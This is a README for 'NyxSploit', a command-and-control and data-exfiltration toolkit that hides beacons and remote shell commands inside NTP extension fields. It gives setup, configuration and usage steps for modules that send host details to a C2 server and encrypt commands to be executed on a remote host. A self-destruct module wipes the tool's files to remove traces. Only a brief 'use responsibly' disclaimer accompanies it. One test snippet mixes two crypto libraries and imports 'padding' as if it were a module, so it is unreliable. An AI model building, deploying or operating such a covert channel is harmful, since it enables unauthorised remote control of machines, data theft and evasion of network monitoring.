<p align="center">
  <img src="https://static.wikia.nocookie.net/megamitensei/images/5/52/Nyx_-_P3_Art.png/revision/latest?cb=20220907213808" alt="NyxSploit Banner" width="600"/>
</p>

# NyxSploit

> “Time never waits... It delivers all the same end.”

NyxSploit is a stealthy command-and-control (C2) and data-exfiltration toolkit that abuses NTP extension fields for covert communication. It bundles multiple modules—**Khaos**, **Thanatos**, **Aletheia**, **Lethe**, **Eidolon**, and **Erebus**—into a single Python script with a stylized menu interface. On start, it even plays a background audio track from Catbox.moe to set the mood.

---

[![GitHub release](https://img.shields.io/github/v/release/yourusername/nyxsploit)](https://github.com/yourusername/nyxsploit/releases)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/Python-3.6%2B-brightgreen.svg)](https://www.python.org/downloads/)

---

## Table of Contents

1. [Features](#features)  
2. [Demo Screenshot](#demo-screenshot)  
3. [Prerequisites](#prerequisites)  
4. [Installation](#installation)  
5. [Audio Setup](#audio-setup)  
6. [Configuration](#configuration)  
   - [Thanatos Config](#thanatos-config)  
   - [Eidolon Key](#eidolon-key)  
7. [Usage](#usage)  
   - [Launching the Menu](#launching-the-menu)  
   - [1) Khaos – Scan NTP Pools](#1-khaos––scan-ntp-pools)  
   - [2) Thanatos – Beacon C2](#2-thanatos––beacon-c2)  
   - [3) Aletheia – Encrypt Command](#3-aletheia––encrypt-command)  
   - [4) Lethe – Decrypt & Execute](#4-lethe––decrypt--execute)  
   - [5) Eidolon – Listen & Log](#5-eidolon––listen--log)  
   - [6) Erebus – Self-Destruct](#6-erebus––self-destruct)  
   - [7) Exit](#7-exit)  
8. [Testing & Validation](#testing--validation)  
9. [Troubleshooting](#troubleshooting)  
10. [Security & Warnings](#security--warnings)  
11. [License](#license)  

---

## Features

- **Menu-Driven Interface**: ASCII-art and boxed outputs for a “hacker-console” feel.  
- **Background Audio**: Plays a dark ambient track from Catbox.moe on startup.  
- **Khaos**: Scan comma-separated NTP servers (pools) to find those that echo TLV fields (“graveyards”).  
- **Thanatos**: Periodically send an encrypted “MortisPacket” (machine ID, OS, timestamp) to your C2 server and listen for replies to execute commands.  
- **Aletheia**: Encrypt arbitrary shell commands (AES-CFB) into a base64 blob saved as `<TARGET>.enc`.  
- **Lethe**: Decrypt a base64 blob with Thanatos’s AES key and execute the recovered command locally.  
- **Eidolon**: Lightweight UDP listener that decrypts incoming “MortisPacket” beacons and logs them to a SQLite database.  
- **Erebus**: Overwrite and delete Thanatos’s config/key files for full self-destruct, leaving no traces on disk.  
- **Auto Dependency Installer**: Detects missing Python modules (`ntplib`, `cryptography`) and installs them via pip or the distro’s package manager (apt, pacman).

---

## Demo Screenshot

<p align="center">
  <img src="https://files.catbox.moe/bjo8av.png" alt="NyxSploit Menu Demo" width="600"/>
</p>

---

## Prerequisites

- **Python 3.6+** (Ubuntu 20.04, Debian 11, Arch Linux, Windows 10 tested)  
- **mpv** (or another CLI audio player that accepts a URL)  
- **SQLite 3** (for Eidolon’s beacon database)  
- **`sudo`** or administrator privileges (to install system packages on Linux)  

---

## Installation

1. **Clone or download** this repository:

   ```bash
   git clone https://github.com/yourusername/nyxsploit.git
   cd nyxsploit

2. **Make the script executable** (optional):

   ```bash
   chmod +x nyx.py
   ```

3. **Install system dependencies** (if not already installed):

   * **Ubuntu/Debian**:

     ```bash
     sudo apt-get update -y
     sudo apt-get install -y python3 python3-pip mpv sqlite3
     ```

   * **Arch/Manjaro**:

     ```bash
     sudo pacman -Sy --noconfirm python mpv sqlite
     ```

   * **Windows**:

     1. Install [Python 3.x](https://www.python.org/downloads/) and add to PATH.
     2. Install [mpv for Windows](https://mpv.io/installation/) and add it to PATH.

4. **Run the script once** to auto-install missing Python modules (`ntplib`, `cryptography`):

   ```bash
   ./nyx.py
   ```

   The script will detect any missing dependencies and install them automatically via pip (or your distro’s package manager).

---

## Audio Setup

NyxSploit uses `mpv` to play a background audio track from Catbox.moe. To change or disable:

1. **Edit the `audio_url`** in `_menu()` inside `nyx.py` to another Catbox.moe URL (MP3/OGG).
2. **Disable audio** by commenting out or removing:

   ```python
   subprocess.Popen(["mpv", audio_url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
   ```

---

## Configuration

### Thanatos Config

Thanatos requires a Python dict with:

* `srv`: C2 server address (e.g., `"time1.example.com"` or `"127.0.0.1"`).
* `port`: UDP port number (e.g., `12345`).
* `intv`: Beacon interval in seconds (e.g., `600` for 10 minutes).
* `keyfile`: Path to a 32-byte AES key file (binary), e.g. `/etc/thanatos.key`.
* `mid`: Machine identifier string, e.g. `"HOST-GUID-1234"`.

Create `/etc/thanatos.conf` (or anywhere you like):

```python
{
  'srv': '127.0.0.1',
  'port': 12345,
  'intv': 10,
  'keyfile': '/tmp/thanatos.key',
  'mid': 'TESTID-0001'
}
```

Generate a 32-byte key file:

```bash
head -c 32 /dev/urandom > /tmp/thanatos.key
```

### Eidolon Key

Eidolon uses the same AES key to decrypt incoming beacons:

1. **Copy** `/tmp/thanatos.key` to `/etc/eidolon.key` (or another path).
2. **Restrict permissions** to root or your user:

   ```bash
   sudo chmod 600 /etc/eidolon.key
   ```

---

## Usage

Run `nyx.py` without arguments to launch the interactive menu:

```bash
./nyx.py
```

1. **Initial Typeout & Audio**

   ```
   Time never waits... It delivers all the same end.
   ```

   (3-second pause, while background track begins)

2. **Main Menu**

   ```
   ╔════════════════════════════╗
   ║        NyxSploit Menu     ║
   ╠════════════════════════════╣
   ║  1) Khaos - Scan NTP Pools ║
   ║  2) Thanatos - Beacon C2   ║
   ║  3) Aletheia - Encrypt Cmd ║
   ║  4) Lethe - Decrypt & Exec ║
   ║  5) Eidolon - Listen & Log ║
   ║  6) Erebus - Self-Destruct ║
   ║  7) Exit                   ║
   ╚════════════════════════════╝
   ```

### 1) Khaos – Scan NTP Pools

* **Purpose**: Discover NTP servers that echo TLV extension fields (so-called “graveyards”).
* **Prompt**:

  ```
  Enter comma-separated NTP pool> 
  Timeout (seconds)> 
  ```
* **Example**:

  ```
  > pool.ntp.org,0.pool.ntp.org
  > 3

  ━━ Verified NTP Graveyards ━━
    pool.ntp.org
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ```

### 2) Thanatos – Beacon C2

* **Purpose**: Periodically send an encrypted MortisPacket (machine ID, OS, timestamp) to your C2 server and listen for encrypted commands in response.

* **Prompt**:

  ```
  Thanatos config path> 
  ```

* **Example**:

  ```
  > /etc/thanatos.conf

     .-''''-. 
    /  .--.  \
   /  /    \  \
   |  |    |  |
   \  \    /  /
    '.'--'.'
  • Thanatos awakens •
  ```

  Thanatos enters beacon loop, sending payloads every `intv` seconds.

* **Local Test**:

  1. Run a UDP listener on your chosen port:

     ```bash
     nc -u -l 12345
     ```
  2. Start Thanatos; you’ll see encrypted packets in the `nc` window every interval.

### 3) Aletheia – Encrypt Command

* **Purpose**: Encrypt a shell command to a base64 blob for Thanatos to consume.
* **Prompt**:

  ```
  Target ID> 
  Command> 
  ```
* **Example**:

  ```
  > TESTID
  > echo "Hello Nyx"

  ━━ Encrypted Command for TESTID ━━
    ZU5XX2I4ZFp5bG… (truncated)
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ```
* **Output**: `TESTID.enc` in the working directory.

### 4) Lethe – Decrypt & Execute

* **Purpose**: Decrypt a base64 payload using Thanatos’s AES key, then execute on the local host.
* **Prompt**:

  ```
  Enter base64 payload> 
  Thanatos key path (default /etc/thanatos.key)> 
  ```
* **Example**:

  ```
  > ZU5XX2I4ZFp5bG…
  > /tmp/thanatos.key

  [Lethe] Executing: echo "Hello Nyx"
  Hello Nyx
  ```

### 5) Eidolon – Listen & Log

* **Purpose**: Listen on a UDP port for encrypted MortisPackets, decrypt them, and log to a SQLite database.
* **Prompt**:

  ```
  SQLite DB path> 
  Listen port> 
  ```
* **Example**:

  ```
  > /tmp/eidolon.db
  > 12345

     ______  _   _   ____
    |  ____|| \ | | / __ \
    | |__   |  \| || |  | |
    |  __|  | . ` || |  | |
    | |____ | |\  || |__| |
    |______||_| \_| \____/
   • Eidolon listens in shadow •

   ╔════════════════════════════════════╗
   ║  ☾ Echo Received — ID: TESTID      ║
   ╚════════════════════════════════════╝
  ```
* **Verify**:

  ```bash
  sqlite3 /tmp/eidolon.db "SELECT * FROM beacons;"
  ```

  Expect rows like:

  ```
  TESTID|192.168.1.100|Linux|162xyz…|None
  ```

### 6) Erebus – Self-Destruct

* **Purpose**: Overwrite and delete Thanatos’s config/key files to wipe traces.
* **Prompt**:

  ```
  Confirm self-destruct (y/N)> 
  ```
* **Example**:

  ```
  > y

  ━━ Erebus Invoked: Cleansing Vessel ━━
    All memory erased. Vessel cleansed.
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ```
* **Result**:

  * `/etc/thanatos.conf` and `/etc/thanatos.key` (or custom paths) are overwritten with random data and removed.

### 7) Exit

* **Select “7”** to terminate NyxSploit (and stop background audio).

---

## Testing & Validation

1. **Dependencies**

   * Ensure `ntplib` and `cryptography` are installed:

     ```bash
     python3 -c "import ntplib; import cryptography; print('OK')"
     ```

2. **Audio Playback**

   * Test `mpv` with the sample Catbox.moe URL:

     ```bash
     mpv https://files.catbox.moe/youraudiofile.mp3
     ```

3. **Khaos Scan**

   * Option 1:

     ```
     pool.ntp.org,0.pool.ntp.org 3
     ```
   * Expect at least one valid entry under “Verified NTP Graveyards”.

4. **Aletheia & Lethe Round-Trip**

   * Option 3 → Encrypt `echo hello`.
   * Option 4 → Paste the base64 output. “hello” should appear, verifying correct encryption/decryption.

5. **Thanatos Beacon**

   * Create a config & key:

     ```bash
     echo "{'srv':'127.0.0.1','port':12345,'intv':5,'keyfile':'/tmp/thanatos.key','mid':'TESTID'}" > /tmp/thanatos.conf
     head -c 32 /dev/urandom > /tmp/thanatos.key
     ```
   * Run `nc -u -l 12345`.
   * Option 2 → `/tmp/thanatos.conf`. Encrypted packets should appear in `nc` every 5 seconds.

6. **Eidolon Logging**

   * Option 5 → `/tmp/eidolon.db` → `12345`.
   * From another shell, send a valid beacon:

     ```bash
     python3 - <<EOF
     import socket, base64
     from hashlib import sha256
     from Crypto.Cipher import AES
     import time, os, padding
     key = open('/etc/eidolon.key','rb').read()
     d = {'mid':'TESTID','os':'Linux','timestamp':int(time.time()),'raw_payload':None}
     p = repr(d).encode()
     iv = os.urandom(16)
     padder = padding.PKCS7(128).padder()
     pd = padder.update(p) + padder.finalize()
     c = AES.new(key, AES.MODE_CFB, iv=iv).encrypt(pd)
     msg = base64.b64encode(iv + c)
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.sendto(msg, ('127.0.0.1', 12345))
     EOF
     ```
   * Check `/tmp/eidolon.db`:

     ```bash
     sqlite3 /tmp/eidolon.db "SELECT * FROM beacons;"
     ```

     You should see a row for “TESTID”.

7. **Erebus Wipe**

   * Create dummy files:

     ```bash
     echo "test" > /tmp/thanatos.conf
     head -c 32 /dev/urandom > /tmp/thanatos.key
     ```
   * Option 6 → confirm → check:

     ```bash
     ls /tmp/thanatos.conf /tmp/thanatos.key
     ```

     Both files should be gone.

---

## Troubleshooting

* **No Sound**

  * Verify `mpv` is installed and in your PATH.
  * Run `mpv <audio_url>` manually to confirm.

* **Missing `ntplib` on Arch**

  * Ensure `python-pip` is installed:

    ```bash
    sudo pacman -Sy --noconfirm python-pip
    ```
  * Re-run `nyx.py` to let it install `ntplib` via `pip3`.

* **Thanatos Doesn’t Send**

  * Check your `thanatos.conf` values (`srv`, `port`).
  * Ensure UDP outbound on that port isn’t blocked by a firewall.
  * Temporarily set `intv` to a small number (e.g. 5) to test faster.

* **Eidolon Doesn’t Log**

  * Confirm `/etc/eidolon.key` matches Thanatos’s key.
  * Check file permissions:

    ```bash
    sudo chmod 600 /etc/eidolon.key
    ```
  * Run Eidolon with `sudo` if necessary, or place `eidolon.key` in a user-writable path.

---

## Security & Warnings

* **Use responsibly.** NyxSploit is a protocol-abuse framework. Do not deploy on networks you do not own or without explicit permission.
* **Self-destruct is irreversible.** Once Erebus runs, the config/key files are destroyed beyond recovery.
* **Protect your AES key.** Anyone with `/etc/thanatos.key` or `/etc/eidolon.key` can decrypt beacons and commands.
* **Stealth vs. detection.** Even though NyxSploit uses NTP (UDP/123), advanced IDS/IPS may notice unusual extension fields. Test in a controlled environment first.

---

## License

This project is licensed under the **MIT License**. See [LICENSE](LICENSE) for details.

---

<p align="center">
  <img src="https://i.ytimg.com/vi/cRSrrquJZP8/maxresdefault.jpg" alt="NyxSploit Footer" width="400"/>
</p>
